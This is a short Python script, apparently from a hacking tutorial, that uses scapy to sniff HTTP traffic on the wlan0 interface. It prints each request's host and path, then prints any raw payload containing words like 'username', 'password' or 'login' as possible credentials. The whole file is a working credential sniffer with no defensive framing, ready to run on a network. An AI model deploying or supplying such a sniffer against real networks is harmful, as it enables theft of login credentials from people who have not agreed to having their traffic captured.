#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        username_keywords = ["username", "password",
                             "email", "key", "user", "id", "login", "pass","uname"]
        for keyword in username_keywords:
            if keyword in str(load):
                return load


def process_sniffed_packet(packet):
    packets_list=[]
    if packet.haslayer(http.HTTPRequest):
        print(packet)

        URL = get_url(packet)
        print("\n\n[+] HTTP Request >> ", URL)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > ", login_info, "\n\n")


sniff("wlan0")  # change if you are using some other interface 
